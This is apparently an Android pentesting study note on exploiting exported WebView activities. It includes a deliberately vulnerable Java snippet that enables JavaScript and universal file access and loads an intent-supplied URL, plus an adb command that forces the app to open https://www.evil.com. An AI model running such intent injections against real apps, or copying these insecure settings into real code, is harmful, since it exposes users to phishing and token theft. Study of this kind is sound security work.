- The `webview` allows to load a remote url and display web pages as part of the activity layout. 
- It doesn't work like a full fledged browser but it shows the data on a web page inside an activity.
- Links opening on the apps itself without going to a browser are example for this.

***How to look for a vulnerable `webview`?***

 => First let's look which all components are exported or not, there are two ways to tell this:
 1. if the component explicitly declares `exported="true"` attribute
 2. The component automatically becomes exported if it has intent filters, unless declared otherwise ie, `exported="false"` 

  => Now confirm that the web view exist by look at source code for `loadwebview()` method.

  => lets spot the vulnerability by looking at an example:

  ```xml
 <activity android:name="com.tmh.vulnwebview.SupportWebView"   android:exported="true"/>
  ```

 -  this is an activity declared on manifest file  which is exported.
 - Let's take a look at a vulnerable web view
 ```java       
 webView.setWebViewClient(new WebViewClient());  
 webView.getSettings().setAllowUniversalAccessFromFileURLs(true);    webView.getSettings().setJavaScriptEnabled(true);  
 if (getIntent().getExtras().getBoolean("is_reg", false)) {  
    webView.loadUrl("file:///android_asset/registration.html");  
     } else {  
          webView.loadUrl(getIntent().getStringExtra("reg_url"));  
         }  
     }  
 }
  ```

 - if we look at the code then we van see that it is loading a url right at the end and it is using a string send through the intent to load the url.

 - So this behaviour can be then exploited by third party application by sending the right intent to component with a url string, and the application will happily accept it as the component is exported which means that third party applications have access to it.

`exploitation:`

 => For to exploit the vulnerability  we will send an intent to the vulnerable component using `adb` this will open a malicious web page provided by the attacker:

 => we use this command for the same:
 
 ```shell
 adb shell am start -n com.tmh.vulnwebview/.RegistrationWebView --es  reg_url "https://www.evil.com"
 ```

 breaking down the command: 
 1. `adb shell`: to start a unique shell on our device 
 2. `am start`: 'am' stands for activity manager here we are instructing android to start the activity manager. this manages all the components of android application. 
 3. `-n` : this flag is used to represent the name of the component where we are sending our intent.
 4. `com.tmh.vulnwebview/.RegistrationWebView` : name of the component, the only change here is that we need to add '/' just before the activity name.
 5. `--es reg_url`: stands for extra string where we are going to end the string url.  the name of the String extra that we get from the activity is `reg_url`
 6. finally provide the malicious link that you want to send to the attacker.


###### javascript enabled for a WebView:

 - web views supports the use of javascript, the developer can enable it by just adding this configuration:
```java
 webView.getSettings().setJavaScriptEnabled(true);
```

- also adding this configuration helps in creating an interface b/w web page's javascript and client side java code:
```java
WebView webView = (WebView) findViewById(R.id.webview);
webView.addJavascriptInterface(new WebAppInterface(this),"Android");
```

- this means that the web page's javascript code can access and inject java code into the application
- as this activity is exported this behaviour can be dangerous and allow an attacker to carry out  attacks including XSS and stealing tokens from the application.

 `exploitation:`
  